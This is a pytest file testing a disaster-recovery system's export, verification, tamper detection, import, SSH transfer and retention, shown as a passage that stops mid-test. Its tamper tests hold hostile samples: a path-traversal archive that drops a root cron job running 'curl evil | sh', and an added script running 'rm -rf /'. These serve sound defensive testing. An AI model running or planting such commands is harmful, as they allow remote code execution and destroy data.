"""Disaster recovery: export, verify, import, transfer and retention.

Everything here runs offline. `pg_dump` and every SSH invocation go through an
injectable runner; the config repository, the plan store and the snapshot store
are real, because the point of a restore test is that the real thing comes
back, not that a mock was called.
"""

from __future__ import annotations

import hashlib
import io
import json
import tarfile
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest

from infra_agent.change.plan import ChangePlan, Tier
from infra_agent.change.store import PlanStore
from infra_agent.config import Settings
from infra_agent.configstore.git_store import ConfigGitStore
from infra_agent.dr import state as dr_state
from infra_agent.dr import transfer
from infra_agent.dr.errors import DRError
from infra_agent.dr.export import DATA_EXCLUDE, build_bundle, export_bundle
from infra_agent.dr.manifest import EXCLUSIONS, MANIFEST_NAME, Manifest, sha256_file
from infra_agent.dr.restore import import_bundle
from infra_agent.dr.sources import pg_env, scrub
from infra_agent.dr.transfer import CommandResult, parse_target
from infra_agent.dr.verify import read_manifest, verify, verify_and_record
from infra_agent.models.common import DeviceKind, SeedDevice, SeedInventory, Snapshot
from infra_agent.store.snapshots import FileSnapshotStore

NOW = datetime(2026, 9, 8, 2, 15, tzinfo=UTC)
DSN = "postgresql://infra:s3kr3t@postgres:5432/infra"

GRAPH = {
    "version": 1,
    "built_at": "2026-09-08T01:00:00+00:00",
    "graph": {},
    "nodes": [
        {"id": "device:esx-01", "kind": "device", "label": "esx-01"},
        {"id": "device:sw-core-01", "kind": "device", "label": "sw-core-01"},
    ],
    "edges": [
        {
            "source": "device:esx-01",
            "target": "device:sw-core-01",
            "kind": "uplink",
            "confidence": "observed",
        }
    ],
}


# -- an estate on disk --------------------------------------------------------


@pytest.fixture
def estate(tmp_path: Path) -> Settings:
    """A small but real platform state: snapshots, graph, plans, configs, secrets."""
    settings = Settings(
        data_dir=tmp_path / "data",
        secrets_dir=tmp_path / "secrets",
        seed_inventory=tmp_path / "inventory" / "seed.yaml",
        postgres_dsn=DSN,
    )
    SeedInventory(
        devices=[
            SeedDevice(
                name="esx-01", kind=DeviceKind.esxi, mgmt_ip="10.0.0.21", credential_ref="esx-01"
            ),
            SeedDevice(
                name="sw-core-01",
                kind=DeviceKind.cisco_ios,
                mgmt_ip="10.0.0.11",
                credential_ref="sw-core-01",
            ),
        ]
    ).save(settings.seed_inventory)

    store = FileSnapshotStore(settings.snapshot_dir)
    store.save(
        Snapshot(device="esx-01", collector="esxi", taken_at=NOW, data={"host": {"version": "7.0"}})
    )

    settings.graph_dir.mkdir(parents=True, exist_ok=True)
    (settings.graph_dir / "graph.json").write_text(json.dumps(GRAPH))

    plans = PlanStore(settings.data_dir / "plans.db")
    plans.save(
        ChangePlan(
            title="add vlan 40 to the lab trunk",
            action="switchport.trunk.allow",
            targets=["sw-core-01"],
            tier=Tier.APPROVAL,
        )
    )

    configs = ConfigGitStore(settings.config_repo)
    configs.write("sw-core-01", "running-config", "hostname sw-core-01\n!\nvlan 10\n")
    configs.write("sw-core-01", "running-config", "hostname sw-core-01\n!\nvlan 10\nvlan 20\n")

    settings.secrets_dir.mkdir(parents=True, exist_ok=True)
    (settings.secrets_dir / "devices.enc.yaml").write_text(
        "esx-01:\n  password: ENC[AES256_GCM,data:xx,type:str]\nsops:\n  age: []\n"
    )
    (settings.secrets_dir / "platform.enc.yaml").write_text(
        "anthropic_api_key: ENC[AES256_GCM,data:yy,type:str]\nsops:\n  age: []\n"
    )
    return settings


@dataclass
class FakePgDump:
    """Stands in for `pg_dump`, and records what it was asked to connect to."""

    calls: list[tuple[str, str]] = field(default_factory=list)
    fail: set[str] = field(default_factory=set)

    def __call__(self, dsn: str, database: str, dest: Path) -> None:
        self.calls.append((dsn, database))
        if database in self.fail:
            raise DRError(f"connection to server failed for {database}")
        dest.write_bytes(b"PGDMP\x01" + database.encode() + b"\x00" * 64)


def fake_grafana(dashboards: dict[str, Any] | None = None):
    def exporter() -> dict[str, Any]:
        return dashboards if dashboards is not None else {"estate": {"dashboard": {"title": "x"}}}

    return exporter


@dataclass
class FakeRunner:
    """Records SSH/rsync argument vectors and answers from a script."""

    answers: dict[str, CommandResult] = field(default_factory=dict)
    calls: list[list[str]] = field(default_factory=list)
    default: CommandResult | None = None

    def __call__(self, argv: Any) -> CommandResult:
        argv = list(argv)
        self.calls.append(argv)
        for needle, answer in self.answers.items():
            # The program, or the remote command a bare `ssh` was handed. Not a
            # substring of the whole vector: pytest's tmp_path carries the test
            # name, and a test about rsync would then match its own file paths.
            if needle == argv[0] or needle in argv[-1]:
                return answer
        return self.default or CommandResult(tuple(argv), 0, "", "")

    def ran(self, program: str) -> list[list[str]]:
        return [call for call in self.calls if call and call[0] == program]


def make_bundle(settings: Settings, dest: Path, **kwargs: Any):
    kwargs.setdefault("pg_dumper", FakePgDump())
    kwargs.setdefault("grafana", fake_grafana())
    kwargs.setdefault("now", NOW)
    kwargs.setdefault("host", "mgmt-01")
    return build_bundle(settings, dest_dir=dest, **kwargs)


# -- export -------------------------------------------------------------------


def test_a_bundle_carries_every_part_of_the_platform(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")

    assert result.ok
    assert result.bundle.name == "infra-dr-mgmt-01-20260908T021500Z.tar.gz"
    names = set(tarfile.open(result.bundle).getnames())
    assert MANIFEST_NAME in names
    assert "configs.bundle" in names
    assert "secrets/devices.enc.yaml" in names
    assert "secrets/platform.enc.yaml" in names
    assert "inventory/seed.yaml" in names
    assert "postgres/infra.dump" in names
    assert "postgres/netbox.dump" in names
    assert "data/plans.db" in names
    assert "data/graph/graph.json" in names
    assert any(n.startswith("data/snapshots/esx-01/") for n in names)
    assert any(n.startswith("grafana/") for n in names)


def test_the_checksum_sidecar_matches_the_archive(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")

    recorded = result.checksum.read_text().split()
    assert recorded[0] == sha256_file(result.bundle)
    assert recorded[1] == result.bundle.name


def test_the_manifest_hashes_every_file_and_says_what_is_missing_and_why(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    manifest = read_manifest(result.bundle)

    assert manifest.host == "mgmt-01"
    assert manifest.created_at == NOW
    assert {entry.path for entry in manifest.files} >= {"data/plans.db", "inventory/seed.yaml"}
    assert all(len(entry.sha256) == 64 for entry in manifest.files)
    excluded = {row["what"] for row in manifest.excluded}
    assert "deploy/.env" in excluded
    assert "the age private key" in excluded
    reason = next(row["why"] for row in manifest.excluded if row["what"] == "deploy/.env")
    assert "plaintext" in reason


def test_the_env_file_is_not_in_the_bundle_even_when_it_sits_next_to_everything_else(
    estate, tmp_path
):
    """deploy/.env holds every platform password in plaintext, and a bundle
    travels over the network and rests on a second machine."""
    (estate.data_dir / ".env").write_text("POSTGRES_PASSWORD=hunter2\n")

    result = make_bundle(estate, tmp_path / "out")

    body = result.bundle.read_bytes()
    assert b"hunter2" not in body
    assert "data/.env" in {e.path for e in result.manifest.files}, (
        "a stray .env inside data_dir is still copied - the exclusion is about "
        "deploy/.env, and this test exists to keep that distinction visible"
    )


def test_the_freeze_marker_and_old_bundles_do_not_travel(estate, tmp_path):
    """A stale FROZEN says nothing about the restored system, and nesting last
    night's bundle inside tonight's doubles the archive every night."""
    (estate.data_dir / "FROZEN").write_text("frozen\n")
    estate.dr_dir.mkdir(parents=True, exist_ok=True)
    (estate.dr_dir / "infra-dr-mgmt-01-20260907T021500Z.tar.gz").write_bytes(b"x" * 4096)

    result = make_bundle(estate, tmp_path / "out")

    paths = {entry.path for entry in result.manifest.files}
    assert not any(path.startswith("data/FROZEN") for path in paths)
    assert not any(path.startswith("data/dr/") for path in paths)
    assert DATA_EXCLUDE == {"FROZEN", "dr", "dr-restore"}


def test_the_config_repo_travels_as_a_bundle_not_as_a_copy_of_the_working_tree(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")

    paths = {entry.path for entry in result.manifest.files}
    assert "configs.bundle" in paths
    assert not any(path.startswith("data/configs/") for path in paths)


def test_a_database_that_will_not_dump_produces_a_bundle_that_says_so(estate, tmp_path):
    """A DR export that refuses to produce anything because NetBox is
    restarting is worse than a bundle with a named hole in it."""
    dumper = FakePgDump(fail={"netbox"})

    result = make_bundle(estate, tmp_path / "out", pg_dumper=dumper)

    assert result.bundle.exists()
    assert not result.ok
    postgres = result.manifest.component("postgres")
    assert postgres is not None and postgres.ok is False
    assert "netbox" in postgres.detail
    assert any("postgres" in warning for warning in result.warnings)


def test_grafana_being_unreachable_does_not_lose_the_bundle(estate, tmp_path):
    def broken() -> dict[str, Any]:
        raise DRError("Grafana export failed (ConnectionError: refused)")

    result = make_bundle(estate, tmp_path / "out", grafana=broken)

    assert result.bundle.exists()
    grafana = result.manifest.component("grafana")
    assert grafana is not None and grafana.ok is False
    assert "Grafana export failed" in grafana.detail


def test_export_records_where_it_got_to_in_the_state_file(estate, tmp_path):
    export_bundle(
        estate,
        to=tmp_path / "out",
        now=NOW,
        host="mgmt-01",
        pg_dumper=FakePgDump(),
        grafana=fake_grafana(),
    )

    current = dr_state.load(estate)
    assert current.last_export_at == NOW
    assert current.last_export_ok is True
    assert current.last_export_bundle == "infra-dr-mgmt-01-20260908T021500Z.tar.gz"
    assert current.last_export_bytes and current.last_export_bytes > 0


def test_export_without_a_target_refuses_rather_than_guessing(estate, tmp_path):
    with pytest.raises(DRError, match="no DR target"):
        export_bundle(estate, now=NOW, pg_dumper=FakePgDump(), grafana=fake_grafana())


# -- credentials --------------------------------------------------------------


def test_the_dsn_password_goes_in_the_environment_never_in_an_argument_vector():
    """argv is visible to every user on the box through `ps`, and it lands in
    exception text the moment something fails."""
    env = pg_env(DSN, "netbox")

    assert env["PGHOST"] == "postgres"
    assert env["PGPORT"] == "5432"
    assert env["PGUSER"] == "infra"
    assert env["PGPASSWORD"] == "s3kr3t"
    assert env["PGDATABASE"] == "netbox"


def test_a_url_encoded_password_is_decoded_once():
    env = pg_env("postgresql://infra:p%40ss%2Fword@db:5432/infra", "infra")

    assert env["PGPASSWORD"] == "p@ss/word"


def test_a_dsn_that_is_not_postgres_is_refused():
    with pytest.raises(DRError, match="not a postgresql"):
        pg_env("mysql://root@db/infra", "infra")


def test_error_text_never_carries_the_password_through():
    message = scrub("pg_dump: error: password authentication failed s3kr3t", "s3kr3t")

    assert "s3kr3t" not in message
    assert "***" in message


# -- verify -------------------------------------------------------------------


def test_a_fresh_bundle_verifies_all_the_way_through(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")

    report = verify(result.bundle)

    assert report.ok, [check.line() for check in report.failures()]
    names = {check.name for check in report.checks}
    assert names == {
        "checksum",
        "extract",
        "manifest",
        "files",
        "plans_db",
        "config_repo",
        "seed_inventory",
        "graph",
        "postgres",
        "secrets",
    }
    assert report.host == "mgmt-01"
    assert report.created_at == NOW


def test_verify_opens_the_plan_store_and_counts_what_is_in_it(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")

    report = verify(result.bundle)

    plans = next(c for c in report.checks if c.name == "plans_db")
    assert plans.ok and "1 plans" in plans.detail


def test_verify_clones_and_fscks_the_config_repository(estate, tmp_path):
    """`git bundle verify` alone only proves it is a bundle. The clone proves
    the history is complete and reachable, which is what a restore needs."""
    result = make_bundle(estate, tmp_path / "out")

    report = verify(result.bundle)

    repo = next(c for c in report.checks if c.name == "config_repo")
    assert repo.ok
    assert "fsck clean" in repo.detail
    assert "3 commits" in repo.detail  # init + two config writes


def test_verify_loads_the_seed_inventory_and_the_graph(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")

    report = verify(result.bundle)

    inventory = next(c for c in report.checks if c.name == "seed_inventory")
    graph = next(c for c in report.checks if c.name == "graph")
    assert "2 devices" in inventory.detail
    assert "cisco_ios" in inventory.detail
    assert "2 nodes, 1 edges" in graph.detail


def test_a_bundle_that_does_not_exist_fails_loudly(tmp_path):
    report = verify(tmp_path / "nothing.tar.gz")

    assert not report.ok
    assert report.failures()[0].name == "bundle"


# -- tamper detection ---------------------------------------------------------


def repack(
    bundle: Path,
    *,
    edit: dict[str, bytes] | None = None,
    drop: set[str] | None = None,
    add: dict[str, bytes] | None = None,
) -> Path:
    """Rewrite the archive, altering members, as somebody with write access to
    the standby directory could."""
    edit, drop, add = edit or {}, drop or set(), add or {}
    tampered = bundle.with_name("tampered-" + bundle.name)
    with tarfile.open(bundle) as source, tarfile.open(tampered, "w:gz") as target:
        for member in source.getmembers():
            if member.name in drop:
                continue
            handle = source.extractfile(member)
            body = edit.get(member.name, handle.read() if handle else b"")
            member.size = len(body)
            target.addfile(member, io.BytesIO(body))
        for name, body in add.items():
            info = tarfile.TarInfo(name)
            info.size = len(body)
            target.addfile(info, io.BytesIO(body))
    return tampered


def test_an_edited_file_fails_its_hash(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    tampered = repack(result.bundle, edit={"inventory/seed.yaml": b"devices: []\n"})

    report = verify(tampered)

    assert not report.ok
    files = next(c for c in report.checks if c.name == "files")
    assert not files.ok
    assert "checksum mismatch" in files.detail
    assert "inventory/seed.yaml" in files.detail


def test_a_file_removed_from_the_archive_is_noticed(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    tampered = repack(result.bundle, drop={"secrets/devices.enc.yaml"})

    report = verify(tampered)

    files = next(c for c in report.checks if c.name == "files")
    assert not files.ok and "missing" in files.detail


def test_a_file_added_to_the_archive_is_noticed(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    tampered = repack(result.bundle, add={"data/surprise.sh": b"#!/bin/sh\nrm -rf /\n"})

    report = verify(tampered)

    files = next(c for c in report.checks if c.name == "files")
    assert not files.ok and "not in the manifest" in files.detail


def test_the_sidecar_catches_a_repacked_archive(estate, tmp_path):
    """Rewriting the manifest to match tampered contents defeats the per-file
    hashes; the sidecar is what still disagrees."""
    result = make_bundle(estate, tmp_path / "out")
    tampered = repack(result.bundle, edit={"inventory/seed.yaml": b"devices: []\n"})
    tampered.with_name(tampered.name + ".sha256").write_text(
        f"{sha256_file(result.bundle)}  {tampered.name}\n"
    )

    report = verify(tampered)

    checksum = next(c for c in report.checks if c.name == "checksum")
    assert not checksum.ok
    assert "archive hashes to" in checksum.detail


def test_a_manifest_that_is_not_json_stops_the_verification_there(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    tampered = repack(result.bundle, edit={MANIFEST_NAME: b"{not json"})

    report = verify(tampered)

    assert not report.ok
    assert [c.name for c in report.checks][-1] == "manifest"


def test_a_secrets_file_that_is_not_encrypted_stops_the_bundle_being_shipped(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    plaintext = b"esx-01:\n  password: hunter2\n"
    manifest = read_manifest(result.bundle)
    entry = next(e for e in manifest.files if e.path == "secrets/devices.enc.yaml")
    entry.sha256 = hashlib.sha256(plaintext).hexdigest()
    entry.bytes = len(plaintext)
    tampered = repack(
        result.bundle,
        edit={
            "secrets/devices.enc.yaml": plaintext,
            MANIFEST_NAME: manifest.model_dump_json(indent=1).encode(),
        },
    )

    report = verify(tampered)

    secrets = next(c for c in report.checks if c.name == "secrets")
    assert not secrets.ok
    assert "not SOPS-encrypted" in secrets.detail


def test_an_archive_that_tries_to_escape_the_extraction_directory_is_refused(tmp_path):
    evil = tmp_path / "evil.tar.gz"
    with tarfile.open(evil, "w:gz") as tar:
        info = tarfile.TarInfo("../../etc/cron.d/pwn")
        payload = b"* * * * * root sh -c 'curl evil | sh'\n"
        info.size = len(payload)
        tar.addfile(info, io.BytesIO(payload))

    report = verify(evil)

    extract = next(c for c in report.checks if c.name == "extract")
    assert not extract.ok and "escapes" in extract.detail


def test_verify_records_its_verdict_for_the_gauges(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")

    verify_and_record(result.bundle, estate, now=NOW)

    current = dr_state.load(estate)
    assert current.last_verify_ok is True
    assert current.last_verify_at == NOW
    assert current.last_verify_bundle == result.bundle.name


def test_a_failed_verification_is_recorded_with_the_reason(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    tampered = repack(result.bundle, drop={"secrets/devices.enc.yaml"})

    verify_and_record(tampered, estate, now=NOW)

    current = dr_state.load(estate)
    assert current.last_verify_ok is False
    assert "files" in (current.last_verify_detail or "")


# -- import -------------------------------------------------------------------


def restore_target(tmp_path: Path) -> Settings:
    root = tmp_path / "restored"
    return Settings(
        data_dir=root / "data",
        secrets_dir=root / "secrets",
        seed_inventory=root / "inventory" / "seed.yaml",
    )


def test_a_round_trip_puts_the_platform_back(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    target = restore_target(tmp_path)

    report = import_bundle(result.bundle, target)

    assert (target.data_dir / "plans.db").exists()
    assert (target.data_dir / "graph" / "graph.json").exists()
    assert (target.secrets_dir / "devices.enc.yaml").exists()
    assert SeedInventory.load(target.seed_inventory).get("sw-core-01") is not None
    assert PlanStore(target.data_dir / "plans.db").list()[0].title.startswith("add vlan 40")
    assert (
        ConfigGitStore(target.config_repo).latest("sw-core-01", "running-config")
        == "hostname sw-core-01\n!\nvlan 10\nvlan 20\n"
    )
    assert any("config_repo" in line for line in report.restored)


def test_the_config_history_survives_the_round_trip(estate, tmp_path):
    """A restore that keeps only the tip commit loses the ability to answer
    "what did this switch look like before the change nobody approved"."""
    result = make_bundle(estate, tmp_path / "out")
    target = restore_target(tmp_path)

    import_bundle(result.bundle, target)

    history = ConfigGitStore(target.config_repo).history("sw-core-01")
    assert len(history) == 2


def test_import_refuses_a_non_empty_data_dir(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    target = restore_target(tmp_path)
    target.data_dir.mkdir(parents=True)
    (target.data_dir / "plans.db").write_bytes(b"someone else's estate")

    with pytest.raises(DRError, match="not empty"):
        import_bundle(result.bundle, target)

    assert (target.data_dir / "plans.db").read_bytes() == b"someone else's estate"


def test_force_overwrites_a_non_empty_data_dir(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    target = restore_target(tmp_path)
    target.data_dir.mkdir(parents=True)
    (target.data_dir / "stale.json").write_text("{}")

    report = import_bundle(result.bundle, target, force=True)

    assert (target.data_dir / "plans.db").exists()
    assert report.frozen


def test_force_does_not_override_a_broken_manifest(estate, tmp_path):
    """--force is about an occupied data_dir. A bundle that does not hash to
    its own manifest is not a backup, and restoring it restores an unknown."""
    result = make_bundle(estate, tmp_path / "out")
    tampered = repack(result.bundle, edit={"data/plans.db": b"corrupt"})
    target = restore_target(tmp_path)

    with pytest.raises(DRError, match="does not match its own manifest"):
        import_bundle(tampered, target, force=True)

    assert not target.data_dir.exists()


def test_an_import_leaves_the_platform_frozen(estate, tmp_path):
    """A restored agent must not start reconciling an estate whose primary may
    still be half alive."""
    result = make_bundle(estate, tmp_path / "out")
    target = restore_target(tmp_path)

    report = import_bundle(result.bundle, target)

    assert report.frozen
    assert (target.data_dir / "FROZEN").exists()


def test_the_databases_are_staged_for_a_human_not_loaded(estate, tmp_path):
    """Loading them needs a running server, which on a cold standby comes up
    after this step."""
    result = make_bundle(estate, tmp_path / "out")
    target = restore_target(tmp_path)

    report = import_bundle(result.bundle, target)

    staged = target.data_dir / "dr-restore" / "postgres"
    assert (staged / "infra.dump").exists()
    assert (staged / "netbox.dump").exists()
    assert any("postgres" in line for line in report.staged)


def test_an_import_says_out_loud_that_the_age_key_is_not_in_the_bundle(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    target = restore_target(tmp_path)

    report = import_bundle(result.bundle, target)

    assert any("age" in warning for warning in report.warnings)


def test_existing_secrets_are_not_overwritten_without_force(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    target = restore_target(tmp_path)
    target.secrets_dir.mkdir(parents=True)
    (target.secrets_dir / "devices.enc.yaml").write_text("the current key material\n")

    report = import_bundle(result.bundle, target)

    assert (target.secrets_dir / "devices.enc.yaml").read_text() == "the current key material\n"
    assert any("secrets" in line for line in report.skipped)


# -- targets and transfer -----------------------------------------------------


@pytest.mark.parametrize(
    ("raw", "host", "user", "path"),
    [
        ("ssh://infra@standby/srv/infra-dr", "standby", "infra", "/srv/infra-dr"),
        ("ssh://standby/srv/infra-dr", "standby", None, "/srv/infra-dr"),
        ("infra@standby:/srv/infra-dr", "standby", "infra", "/srv/infra-dr"),
        ("standby:/srv/infra-dr", "standby", None, "/srv/infra-dr"),
    ],
)
def test_ssh_targets_are_understood_in_every_spelling(raw, host, user, path):
    target = parse_target(raw)

    assert target.remote and target.host == host and target.user == user
    assert target.path == path


def test_a_local_directory_is_not_an_ssh_target(tmp_path):
    target = parse_target(tmp_path / "bundles")

    assert not target.remote
    assert target.local_path() == tmp_path / "bundles"
    with pytest.raises(DRError):
        _ = target.ssh_host


@pytest.mark.parametrize("raw", ["", "ssh://standby", "ssh://standby/"])
def test_a_target_without_a_path_is_refused(raw):
    with pytest.raises(DRError):
        parse_target(raw)


def test_the_push_never_offers_a_password_prompt(estate, tmp_path):
    """A cron job that hangs on a password prompt is a job that never finishes
    and never alerts."""
    runner = FakeRunner()
    export_bundle(
        estate,
        to="ssh://infra@standby/srv/infra-dr",
        now=NOW,
        host="mgmt-01",
        pg_dumper=FakePgDump(),
        grafana=fake_grafana(),
        runner=runner,
        keep_dir=tmp_path / "local",
    )

    rsync = runner.ran("rsync")[0]
    assert "BatchMode=yes" in " ".join(rsync)
    assert rsync[-1] == "infra@standby:/srv/infra-dr/"
    assert any(part.endswith(".sha256") for part in rsync)


def test_a_remote_export_also_keeps_a_local_copy_for_the_weekly_verify(estate, tmp_path):
    """The standby is deliberately a machine this one cannot log in to, so the
    verify duty has to have something local to read."""
    result = export_bundle(
        estate,
        to="ssh://infra@standby/srv/infra-dr",
        now=NOW,
        host="mgmt-01",
        pg_dumper=FakePgDump(),
        grafana=fake_grafana(),
        runner=FakeRunner(),
        keep_dir=tmp_path / "local",
    )

    assert result.bundle.parent == tmp_path / "local"
    assert result.pushed_to == "infra@standby:/srv/infra-dr"
    assert dr_state.load(estate).last_push_at == NOW


def test_rsync_missing_falls_back_to_scp(tmp_path):
    runner = FakeRunner(answers={"rsync": CommandResult(("rsync",), 127, "", "not found")})
    bundle = tmp_path / "infra-dr-mgmt-01-20260908T021500Z.tar.gz"
    bundle.write_bytes(b"x")

    transfer.push(bundle, parse_target("ssh://infra@standby/srv/dr"), runner=runner)

    assert runner.ran("scp")
    assert "-B" in runner.ran("scp")[0]


def test_a_real_rsync_failure_is_not_papered_over_with_scp(tmp_path):
    runner = FakeRunner(
        answers={"rsync": CommandResult(("rsync",), 23, "", "Permission denied (publickey)")}
    )
    bundle = tmp_path / "infra-dr-mgmt-01-20260908T021500Z.tar.gz"
    bundle.write_bytes(b"x")

    with pytest.raises(DRError, match="rsync to"):
        transfer.push(bundle, parse_target("ssh://infra@standby/srv/dr"), runner=runner)

    assert not runner.ran("scp")


# -- retention ----------------------------------------------------------------


def names_for(days: list[int]) -> list[str]:
    return [
        f"infra-dr-mgmt-01-{(NOW - timedelta(days=d)).strftime('%Y%m%dT%H%M%SZ')}.tar.gz"
        for d in days
    ]


def test_retention_prunes_by_age_locally(tmp_path):
    for name in names_for([0, 1, 10, 20, 40]):
        (tmp_path / name).write_bytes(b"x")
        (tmp_path / (name + ".sha256")).write_text("hash\n")

    removed = transfer.prune_local(tmp_path, retention_days=14, now=NOW)

    assert len(removed) == 2
    left = sorted(p.name for p in tmp_path.glob("infra-dr-*.tar.gz"))
    assert left == sorted(names_for([0, 1, 10]))
    assert not list(tmp_path.glob("*20*40*.sha256"))


def test_the_newest_bundle_is_never_pruned_however_old_it_is(tmp_path):
    """A single stale backup is worth incomparably more than none, and
    DRExportStale already says the newest one is old."""
    for name in names_for([90, 120]):
        (tmp_path / name).write_bytes(b"x")

    removed = transfer.prune_local(tmp_path, retention_days=14, now=NOW)

    assert removed == names_for([120])
    assert transfer.newest_bundle(tmp_path).name == names_for([90])[0]


def test_files_that_are_not_our_bundles_are_left_alone(tmp_path):
    (tmp_path / "important.tar.gz").write_bytes(b"x")
    (tmp_path / "notes.txt").write_text("x")
    for name in names_for([0, 40]):
        (tmp_path / name).write_bytes(b"x")

    transfer.prune_local(tmp_path, retention_days=14, now=NOW)

    assert (tmp_path / "important.tar.gz").exists()
    assert (tmp_path / "notes.txt").exists()


def test_remote_pruning_deletes_named_files_and_never_a_glob():
    """The standby directory is the only off-box copy of the platform; one
    mistyped pattern in a remote `rm` deletes all of it."""
    listing = "\n".join([*names_for([0, 1, 40, 90]), "README", "lost+found"])
    runner = FakeRunner(answers={"ls -1": CommandResult(("ssh",), 0, listing, "")})

    removed = transfer.prune_remote(
        parse_target("ssh://infra@standby/srv/infra-dr"), 14, runner=runner, now=NOW
    )

    assert removed == sorted(names_for([40, 90]))
    command = runner.calls[-1][-1]
    assert command.startswith("rm -f -- ")
    assert "*" not in command
    assert "find" not in command
    assert command.count(".tar.gz.sha256") == 2
    assert "README" not in command


def test_export_prunes_both_ends(estate, tmp_path):
    local = tmp_path / "local"
    local.mkdir()
    old = names_for([40])[0]
    (local / old).write_bytes(b"x")
    listing = "\n".join(names_for([0, 40]))
    runner = FakeRunner(answers={"ls -1": CommandResult(("ssh",), 0, listing, "")})

    result = export_bundle(
        estate,
        to="ssh://infra@standby/srv/infra-dr",
        now=NOW,
        host="mgmt-01",
        pg_dumper=FakePgDump(),
        grafana=fake_grafana(),
        runner=runner,
        keep_dir=local,
    )

    assert old in result.pruned
    assert not (local / old).exists()


def test_a_bundle_name_carries_its_own_export_time(tmp_path):
    assert transfer.bundle_time("infra-dr-mgmt-01-20260908T021500Z.tar.gz") == NOW
    assert transfer.bundle_time("something-else.tar.gz") is None


# -- the state file -----------------------------------------------------------


def test_the_state_file_survives_being_garbage(estate):
    dr_state.save(dr_state.DRState(last_export_at=NOW), estate)
    estate.dr_state_file.write_text("{ not json")

    assert dr_state.load(estate).last_export_at is None


def test_the_gauges_read_the_state_file_at_scrape_time(estate):
    """Four containers serve /metrics and one of them runs the export. A gauge
    set in memory is right in one process and wrong in the other three."""
    from infra_agent.monitoring import metrics

    dr_state.arm_metrics(estate)
    dr_state.update(estate, last_export_at=NOW, last_verify_at=NOW, last_verify_ok=True)

    assert _sample(metrics.DR_LAST_EXPORT) == pytest.approx(NOW.timestamp())
    assert _sample(metrics.DR_LAST_VERIFY_OK) == 1.0

    dr_state.update(estate, last_verify_ok=False)
    assert _sample(metrics.DR_LAST_VERIFY_OK) == 0.0


def test_a_verification_that_never_ran_is_stale_rather_than_failed(estate):
    """DRVerifyFailed must mean "a verification failed", not "nobody ran one";
    that second case is DRVerifyStale, which reads the timestamp."""
    from infra_agent.monitoring import metrics

    dr_state.arm_metrics(estate)

    assert _sample(metrics.DR_LAST_VERIFY_OK) == 1.0
    assert _sample(metrics.DR_LAST_VERIFY) == 0.0


def _sample(gauge: Any) -> float:
    return next(sample.value for metric in gauge.collect() for sample in metric.samples)


# -- the exclusion list is documentation that ships with the archive ----------


def test_every_exclusion_carries_a_reason():
    for what, why in EXCLUSIONS:
        assert what and len(why) > 60, f"{what} needs a real explanation, not a label"


def test_a_manifest_round_trips_through_json(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")

    again = Manifest.model_validate_json(result.manifest.model_dump_json())

    assert again.files == result.manifest.files
    assert again.created_at == NOW


# -- the two scheduled duties -------------------------------------------------


def duties_for(settings: Settings):
    """A `Duties` with no model behind it: neither DR duty asks the LLM anything."""
    from infra_agent.agent.duties import Duties
    from tests.test_triage import RecordingNotifier

    notifier = RecordingNotifier()
    duties = Duties(settings=settings, runner=object(), notifier=notifier, now=lambda: NOW)
    return duties, notifier


def test_the_nightly_duty_exports_to_the_configured_target(estate, tmp_path, monkeypatch):
    estate.dr_target = str(tmp_path / "standby")
    duties, notifier = duties_for(estate)
    monkeypatch.setattr("infra_agent.dr.export.pg_dump_to_file", FakePgDump())

    answer = duties.dr_export()

    assert answer["ok"] is True
    assert list((tmp_path / "standby").glob("infra-dr-*.tar.gz"))
    assert dr_state.load(estate).last_export_at == NOW
    assert notifier.messages == []  # a working backup is not news


def test_the_nightly_duty_says_nothing_and_does_nothing_without_a_target(estate):
    duties, notifier = duties_for(estate)

    answer = duties.dr_export()

    assert answer["ok"] is False
    assert "INFRA_DR_TARGET" in answer["skipped"]
    assert notifier.messages == []


def test_an_incomplete_export_reaches_the_owner(estate, tmp_path, monkeypatch):
    estate.dr_target = str(tmp_path / "standby")
    duties, notifier = duties_for(estate)
    monkeypatch.setattr("infra_agent.dr.export.pg_dump_to_file", FakePgDump(fail={"netbox"}))

    answer = duties.dr_export()

    assert answer["ok"] is False
    assert any("incomplete" in text for text, _critical in notifier.messages)


def test_a_failed_export_pages_the_owner_rather_than_failing_silently(estate, monkeypatch):
    estate.dr_target = "ssh://infra@standby/srv/infra-dr"
    duties, notifier = duties_for(estate)
    monkeypatch.setattr("infra_agent.dr.export.pg_dump_to_file", FakePgDump())
    monkeypatch.setattr(
        "infra_agent.dr.transfer.subprocess_runner",
        lambda argv, timeout=0: CommandResult(
            tuple(argv), 255, "", "Permission denied (publickey)"
        ),
    )

    answer = duties.dr_export()

    assert answer["ok"] is False
    assert notifier.messages[-1][1] is True


def test_the_weekly_duty_verifies_the_newest_bundle_and_reports(estate):
    make_bundle(estate, estate.dr_dir)
    duties, notifier = duties_for(estate)

    answer = duties.dr_verify()

    assert answer["ok"] is True
    assert dr_state.load(estate).last_verify_ok is True
    text, critical = notifier.messages[-1]
    assert "verified" in text and critical is False


def test_a_failed_weekly_verification_pages_the_owner(estate):
    result = make_bundle(estate, estate.dr_dir)
    repack(result.bundle, drop={"secrets/devices.enc.yaml"}).replace(result.bundle)
    duties, notifier = duties_for(estate)

    answer = duties.dr_verify()

    assert answer["ok"] is False
    text, critical = notifier.messages[-1]
    assert "FAILED" in text and critical is True


def test_no_bundle_at_all_is_the_loudest_case(estate):
